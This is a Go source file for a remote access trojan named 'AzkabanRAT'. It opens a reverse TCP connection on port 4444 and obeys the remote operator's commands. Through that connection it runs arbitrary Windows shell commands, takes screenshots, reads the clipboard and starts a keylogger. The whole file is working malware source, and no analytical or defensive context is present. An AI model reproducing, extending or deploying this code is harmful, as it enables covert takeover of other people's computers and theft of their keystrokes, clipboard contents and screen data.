package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
    "strings"

    "./clipboard"
    "./keylogger"
    "./screenshot"
)
func getLocalAttackerIP() string {
    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
        return "127.0.0.1"
    }
    defer conn.Close()
    localAddr := conn.LocalAddr().(*net.UDPAddr)
    return localAddr.IP.String()
}
var (
    LHOST = getLocalAttackerIP()
    LPORT = "4444"
)


func handleConnection(conn net.Conn) {
    defer conn.Close()

    reader := bufio.NewReader(conn)

    for {
        commandLine, err := reader.ReadString('\n')
        if err != nil {
            break
        }

        cmd := strings.TrimSpace(commandLine)

        switch {
        case cmd == "exit":
            conn.Write([]byte("[AzkabanRAT] Farewell, master.\n"))
            return

        case strings.HasPrefix(cmd, "cmd "):
            output := runShellCommand(strings.TrimPrefix(cmd, "cmd "))
            conn.Write([]byte(output))

        case cmd == "screenshot":
            filename := "screenshot.png"
            err := screenshot.CaptureAndSave(filename)
            if err != nil {
                conn.Write([]byte("[AzkabanRAT] Screenshot failed.\n"))
            } else {
                conn.Write([]byte("[AzkabanRAT] Screenshot captured.\n"))
            }

        case cmd == "clipboard":
            text := clipboard.ReadClipboard()
            conn.Write([]byte("[AzkabanRAT] Clipboard content: " + text + "\n"))

        case cmd == "keylog":
            conn.Write([]byte("[AzkabanRAT] Keylogging started. Press CTRL+C to stop.\n"))
            keylogger.StartLogging()

        default:
            conn.Write([]byte("[AzkabanRAT] Unknown spell: " + cmd + "\n"))
        }
    }
}
func runShellCommand(cmd string) string {
    out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
    if err != nil {
        return fmt.Sprintf("[!] Command error: %s\n", err)
    }
    return string(out)
}
func main() {
    conn, err := net.Dial("tcp", LHOST+":"+LPORT)
    if err != nil {
        return
    }
    handleConnection(conn)
}


